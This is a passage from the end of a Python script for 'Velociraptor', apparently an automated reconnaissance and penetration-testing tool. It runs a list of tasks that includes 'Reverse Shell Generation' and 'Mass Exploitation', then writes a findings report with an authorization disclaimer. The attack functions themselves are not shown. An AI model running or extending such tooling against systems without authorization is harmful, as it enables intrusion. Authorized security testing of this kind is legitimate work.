            ("S3 Bucket Enumeration", self.s3_bucket_enumeration),
            ("CMS Enumeration", self.cms_enumeration),
            ("WAF Detection", self.waf_detection),
            ("Information Disclosure", self.information_disclosure),
            ("Reverse Shell Generation", self.reverse_shell_generation),
            ("Mass Exploitation", self.mass_exploitation),
            ("Vulnerability Scanning", self.vulnerability_scanning),
            ("Subdomain Takeover", self.subdomain_takeover),
            ("Endpoint Analysis", self.endpoint_analysis),
            ("Technology Detection", self.technology_detection)
        ]
        
        for task_name, task_func in recon_tasks:
            try:
                logger.info(f"\n{'='*20} {task_name} {'='*20}")
                task_func()
                logger.info(f"✓ {task_name} completed")
            except Exception as e:
                logger.error(f"✗ {task_name} failed: {e}")
        
        # Generate final report
        self.generate_final_report()
        
        logger.info("\n" + "=" * 60)
        logger.info("VELOCIRAPTOR RECONNAISSANCE COMPLETED!")
        logger.info(f"Results saved in: {self.base_dir}")
        logger.info("=" * 60)
    
    def generate_final_report(self):
        """Generate a comprehensive final report."""
        report_file = os.path.join(self.base_dir, "FINAL_REPORT.md")
        
        with open(report_file, 'w') as f:
            f.write("# Velociraptor Final Reconnaissance Report\n\n")
            f.write(f"**Target Domain:** {self.target_domain}\n")
            f.write(f"**Scan Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"**Local IP:** {self.local_ip}\n\n")
            
            f.write("## Executive Summary\n\n")
            f.write("This report contains the results of automated reconnaissance performed by Velociraptor.\n\n")
            
            f.write("## Tools Status\n\n")
            for tool, status in self.tools_status.items():
                status_icon = "✓" if status else "✗"
                f.write(f"- {status_icon} {tool}\n")
            
            f.write("\n## Directory Structure\n\n")
            for folder in self.folders:
                f.write(f"- `{folder}/` - Contains results from {folder.replace('_', ' ').title()}\n")
            
            f.write("\n## Key Findings\n\n")
            f.write("Review the following directories for detailed results:\n\n")
            
            key_directories = [
                ("subdomain_enumeration", "Subdomains discovered"),
                ("port_scan", "Open ports and services"),
                ("vulnerability_scanning", "Vulnerabilities found"),
                ("security_headers_check", "Security header analysis"),
                ("technology_detection", "Technologies identified"),
                ("information_disclosure", "Sensitive information found")
            ]
            
            for folder, description in key_directories:
                f.write(f"- **{folder}/** - {description}\n")
            
            f.write("\n## Next Steps\n\n")
            f.write("1. Review all discovered subdomains for potential attack vectors\n")
            f.write("2. Analyze vulnerability scan results for exploitable weaknesses\n")
            f.write("3. Check for misconfigurations in security headers\n")
            f.write("4. Investigate any exposed sensitive information\n")
            f.write("5. Test discovered endpoints for additional vulnerabilities\n")
            f.write("6. Consider manual testing for complex vulnerabilities\n\n")
            
            f.write("## Disclaimer\n\n")
            f.write("This tool is for authorized penetration testing only. Always ensure you have proper authorization before testing any systems.\n")


def main():
    """Main function to run Velociraptor."""
    if len(sys.argv) != 2:
        print("Usage: python3 velociraptor.py <target_domain>")
        print("Example: python3 velociraptor.py example.com")
        sys.exit(1)
    
    target_domain = sys.argv[1]
    
    # Validate domain format
    if not target_domain or '.' not in target_domain:
        print("Error: Please provide a valid domain name")
        sys.exit(1)
    
    # Create and run Velociraptor
    velociraptor = Velociraptor(target_domain)
    velociraptor.run_full_recon()


if __name__ == "__main__":
    main() 